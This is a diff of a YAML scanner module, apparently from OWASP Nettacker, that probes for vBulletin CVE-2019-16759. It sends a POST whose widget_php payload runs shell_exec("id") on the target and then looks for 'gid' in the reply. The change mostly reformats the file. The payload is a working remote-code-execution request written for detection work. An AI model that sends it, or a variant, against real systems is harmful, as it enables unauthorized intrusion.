@@ -2,46 +2,45 @@ info:
   name: vbulletin_cve_2019_16759_vuln
   author: OWASP Nettacker Team
   severity: 9
-  description:
-  reference:
+  description: null
+  reference: null
   profiles:
-    - vuln
-    - http
-    - critical_severity
-    - vbulletin
-    - cve
-
+  - vuln
+  - http
+  - critical_severity
+  - vbulletin
+  - cve_2019
 payloads:
-  - library: http
-    steps:
-      - method: post
-        timeout: 3
-        headers:
-          User-Agent: "{user_agent}"
-        allow_redirects: false
-        ssl: false
-        url:
-          nettacker_fuzzer:
-            input_format: "{{schema}}://{target}:{{ports}}/ajax/render/widget_tabbedcontainer_tab_panel"
-            prefix: ""
-            suffix: ""
-            interceptors:
-            data:
-              schema:
-                - "http"
-                - "https"
-              ports:
-                - 80
-                - 443
-          data:
-            "subWidgets[0][template]": "widget_php"
-            "subWidgets[0][config][code]": 'echo shell_exec("id"); exit;'
-        response:
-          condition_type: and
-          conditions:
-            status_code:
-              regex: "200"
-              reverse: false
-            content:
-              regex: gid
-              reverse: false
+- library: http
+  steps:
+  - method: post
+    timeout: 3
+    headers:
+      User-Agent: '{user_agent}'
+    allow_redirects: false
+    ssl: false
+    url:
+      nettacker_fuzzer:
+        input_format: '{{schema}}://{target}:{{ports}}/ajax/render/widget_tabbedcontainer_tab_panel'
+        prefix: ''
+        suffix: ''
+        interceptors: null
+        data:
+          schema:
+          - http
+          - https
+          ports:
+          - 80
+          - 443
+      data:
+        subWidgets[0][template]: widget_php
+        subWidgets[0][config][code]: echo shell_exec("id"); exit;
+    response:
+      condition_type: and
+      conditions:
+        status_code:
+          regex: '200'
+          reverse: false
+        content:
+          regex: gid
+          reverse: false
